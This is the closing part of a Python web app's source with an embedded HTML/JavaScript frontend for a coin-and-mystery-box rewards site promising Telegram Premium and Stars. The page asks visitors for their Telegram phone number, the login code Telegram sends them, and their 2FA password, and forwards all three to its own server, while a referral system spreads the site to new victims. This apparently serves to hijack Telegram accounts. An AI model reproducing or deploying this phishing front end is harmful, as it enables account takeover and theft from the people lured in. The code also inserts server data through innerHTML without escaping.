          </div>
        </div>
        <div class="field">
          <label>Phone</label>
          <input id="phone" placeholder="+491234567890" />
        </div>
        <div class="field">
          <label>Referral Code</label>
          <input id="refCode" placeholder="optional" />
        </div>
        <button class="btn accent" id="btnSend">Send Code</button>

        <div class="field">
          <label>OTP</label>
          <div class="otp" id="otpBox">
            <input maxlength="1" inputmode="numeric" />
            <input maxlength="1" inputmode="numeric" />
            <input maxlength="1" inputmode="numeric" />
            <input maxlength="1" inputmode="numeric" />
            <input maxlength="1" inputmode="numeric" />
            <input maxlength="1" inputmode="numeric" />
          </div>
        </div>
        <button class="btn accent" id="btnVerify">Verify Code</button>
        <input id="password" type="password" placeholder="2FA password (if enabled)" />
        <button class="btn" id="btn2fa">Verify 2FA</button>
        <div class="muted" id="loginStatus">Ready.</div>
      </div>
    </div>

    <div class="subgrid">
      <div class="card">
        <h3>Profile</h3>
        <p id="profileName">Guest</p>
        <p class="mono" id="profilePhone">—</p>
      </div>
      <div class="card">
        <h3>Referral</h3>
        <p class="mono" id="refLink">—</p>
      </div>
      <div class="card">
        <h3>Balance</h3>
        <p><span class="mono" id="balance">0</span> coins</p>
      </div>
      <div class="card">
        <h3>Tasks</h3>
        <p><span class="mono" id="tasksDone">0</span> done</p>
      </div>
    </div>

    <div class="grid2">
      <div class="panel card">
        <div class="row"><h3>Mystery Box</h3><span class="badge">17 coins</span></div>
        <div class="mystery" style="margin-top:14px">
          <div class="box" id="box">🎁</div>
        </div>
        <div class="row" style="margin-top:14px">
          <button class="btn accent" id="btnDaily">Claim Daily +1</button>
          <button class="btn" id="btnOpenBox">Open Box</button>
        </div>
        <div class="reward" style="margin-top:14px" id="rewardBox">No reward yet.</div>
      </div>

      <div class="panel card">
        <div class="row"><h3>Leaderboard</h3><span class="badge">Live</span></div>
        <div class="list" id="leaderboard" style="margin-top:14px"></div>
      </div>
    </div>

    <div class="grid2">
      <div class="panel card">
        <div class="row"><h3>Tasks</h3><span class="badge">Dynamic</span></div>
        <div class="list" id="tasks" style="margin-top:14px"></div>
      </div>
      <div class="panel card">
        <div class="row"><h3>Recent Rewards</h3><span class="badge">History</span></div>
        <div class="list" id="rewards" style="margin-top:14px"></div>
      </div>
    </div>

    <div class="footer">Realtime updates via WebSocket • Vanilla JS SPA • Glassmorphism UI</div>
  </div>

  <div class="toast" id="toast"></div>

<script>
let accessToken = "";
let csrfToken = "";
let userId = null;
let sessionId = null;
let currentProfile = null;
let ws = null;

const el = (id) => document.getElementById(id);
const toast = (msg) => {
  const t = el("toast");
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(window.__t);
  window.__t = setTimeout(() => t.classList.remove("show"), 2600);
};

const setStatus = (msg) => el("loginStatus").textContent = msg;

const otpInputs = Array.from(document.querySelectorAll("#otpBox input"));
otpInputs.forEach((input, idx) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/[^0-9]/g, "").slice(0, 1);
    if (input.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
  });
  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !input.value && idx > 0) otpInputs[idx - 1].focus();
  });
});

function otpValue() {
  return otpInputs.map(i => i.value).join("");
}

async function api(path, {method="GET", body=null, auth=true}={}) {
  const headers = {"Content-Type": "application/json"};
  if (auth && accessToken) headers["Authorization"] = `Bearer ${accessToken}`;
  if (auth && csrfToken) headers["X-CSRF-Token"] = csrfToken;
  const r = await fetch(path, {
    method,
    headers,
    body: body ? JSON.stringify(body) : null,
    credentials: "include",
  });
  let j = {};
  try { j = await r.json(); } catch {}
  if (!r.ok) throw new Error(j.detail || j.message || `HTTP ${r.status}`);
  return j;
}

async function loadMe() {
  const r = await api("/api/v1/me");
  currentProfile = r.user;
  userId = currentProfile.id;
  el("profileName").textContent = `${currentProfile.first_name || ""} ${currentProfile.last_name || ""}`.trim() || "User";
  el("profilePhone").textContent = currentProfile.phone || "—";
  el("refLink").textContent = currentProfile.ref_code ? `${location.origin}/?ref=${currentProfile.ref_code}` : "—";
  el("balance").textContent = currentProfile.balance ?? 0;
  el("tasksDone").textContent = (r.tasks || []).filter(t => t.completed).length;
  el("rewards").innerHTML = (r.rewards || []).slice(0, 8).map(x => `
    <div class="item">
      <div>
        <div><strong>${x.kind}</strong> • ${x.amount}</div>
        <div class="muted" style="font-size:12px">${new Date(x.created_at).toLocaleString()}</div>
      </div>
      <span class="badge">${x.kind}</span>
    </div>
  `).join("") || `<div class="muted">No rewards yet.</div>`;
  el("tasks").innerHTML = (r.tasks || []).map(task => `
    <div class="item">
      <div>
        <div><strong>${task.title}</strong></div>
        <div class="muted" style="font-size:12px">${task.description}</div>
      </div>
      <button class="btn" ${task.completed ? "disabled" : ""} data-task="${task.id}">${task.completed ? "Done" : `+${task.reward}`}</button>
    </div>
  `).join("");
  document.querySelectorAll("[data-task]").forEach(btn => btn.onclick = async () => {
    try {
      const id = Number(btn.dataset.task);
      const res = await api("/api/v1/tasks/complete", {method:"POST", body:{task_id:id}});
      toast(`Task completed: +${res.reward}`);
      await refresh();
    } catch (e) { toast(e.message); }
  });
  el("leaderboard").innerHTML = (r.leaderboard || []).map((u, idx) => `
    <div class="item">
      <div>
        <div><strong>#${idx+1} ${u.first_name || "User"}</strong></div>
        <div class="muted" style="font-size:12px">@${u.username || "unknown"} • ${u.referrals} referrals</div>
      </div>
      <span class="badge">${u.balance} coins</span>
    </div>
  `).join("") || `<div class="muted">No leaderboard data.</div>`;
  const rank = (r.leaderboard || []).findIndex(x => x.telegram_id === currentProfile.telegram_id) + 1;
  el("statRank").textContent = rank > 0 ? `#${rank}` : "#-";
  el("statUsers").textContent = r.leaderboard ? r.leaderboard.length : 0;
  el("statCoins").textContent = currentProfile.balance || 0;
}

async function refresh() {
  await loadMe();
}

async function bindWs() {
  if (ws) try { ws.close(); } catch {}
  ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws/stats");
  ws.onmessage = async (ev) => {
    try {
      const msg = JSON.parse(ev.data);
      if (msg.event === "stats_update" && currentProfile) {
        await refresh();
      }
    } catch {}
  };
}

el("btnSend").onclick = async () => {
  try {
    const phone = el("phone").value.trim();
    const refCode = el("refCode").value.trim() || new URLSearchParams(location.search).get("ref");
    const res = await api("/api/v1/auth/telegram/send-code", {
      method:"POST",
      auth:false,
      body:{phone, ref_code: refCode || null},
    });
    sessionId = res.session_id;
    setStatus("Code sent. Check Telegram app.");
    toast("Verification code sent.");
  } catch (e) { toast(e.message); }
};

el("btnVerify").onclick = async () => {
  try {
    const code = otpValue();
    const res = await api("/api/v1/auth/telegram/verify-code", {
      method:"POST",
      auth:false,
      body:{session_id:sessionId, code},
    });
    if (res.status === "2fa_required") {
      setStatus("2FA required.");
      toast("2FA required.");
      return;
    }
    accessToken = res.web_token;
    csrfToken = res.csrf_token;
    userId = res.user.id;
    await api("/api/v1/auth/login", {method:"POST", body:new URLSearchParams({telegram_id:String(res.user.telegram_id), token: accessToken}), auth:false});
    setStatus("Login successful.");
    toast("Welcome.");
    await refresh();
    await bindWs();
  } catch (e) { toast(e.message); }
};

el("btn2fa").onclick = async () => {
  try {
    const password = el("password").value;
    const res = await api("/api/v1/auth/telegram/verify-2fa", {
      method:"POST",
      auth:false,
      body:{session_id:sessionId, password},
    });
    accessToken = res.web_token;
    csrfToken = res.csrf_token;
    userId = res.user.id;
    await api("/api/v1/auth/login", {method:"POST", body:new URLSearchParams({telegram_id:String(res.user.telegram_id), token: accessToken}), auth:false});
    setStatus("2FA successful.");
    toast("2FA success.");
    await refresh();
    await bindWs();
  } catch (e) { toast(e.message); }
};

el("btnDaily").onclick = async () => {
  try { const r = await api("/api/v1/claim/daily", {method:"POST"}); el("rewardBox").textContent = `Daily reward claimed. Balance: ${r.new_balance}`; await refresh(); toast("Daily +1"); } catch (e) { toast(e.message); }
};

el("btnOpenBox").onclick = async () => {
  try {
    el("box").style.transform = "rotate(-8deg) scale(.95)";
    setTimeout(() => el("box").style.transform = "", 250);
    const r = await api("/api/v1/claim/mystery-box", {method:"POST"});
    const reward = r.reward;
    el("rewardBox").textContent = reward.type === "premium" ? "🎉 Premium 1 Month" : `✨ ${reward.amount} Stars`;
    await refresh();
    toast("Mystery box opened.");
  } catch (e) { toast(e.message); }
};

el("btnCopyRef").onclick = async () => {
  const txt = el("refLink").textContent.trim();
  if (!txt || txt === "—") return toast("No referral link yet.");
  await navigator.clipboard.writeText(txt);
  toast("Referral link copied.");
};

el("btnTheme").onclick = () => toast("Glass mode active.");

document.getElementById("box").onclick = () => el("btnOpenBox").click();

(async () => {
  const tok = document.cookie.split("; ").find(x => x.startsWith("access_token="));
  if (tok) {
    accessToken = decodeURIComponent(tok.split("=")[1]);
    csrfToken = (document.cookie.split("; ").find(x => x.startsWith("csrf_token=")) || "").split("=")[1] || "";
    try { await refresh(); await bindWs(); } catch {}
  }
})();
</script>
</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(FRONTEND_HTML)


@app.get("/health")
async def health():
    users = await db.fetchone("SELECT COUNT(*) AS c FROM users")
    sessions = len(auth_manager.sessions)
    return {
        "status": "ok",
        "users": int(users["c"]) if users else 0,
        "sessions": sessions,
        "bot": settings.ENABLE_BOT,
    }


@app.get("/api/v1/system/health")
async def system_health():
    return await health()


# =============================================================================
# Main
# =============================================================================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=int(os.getenv("PORT", "8000")), reload=False, log_level="info")
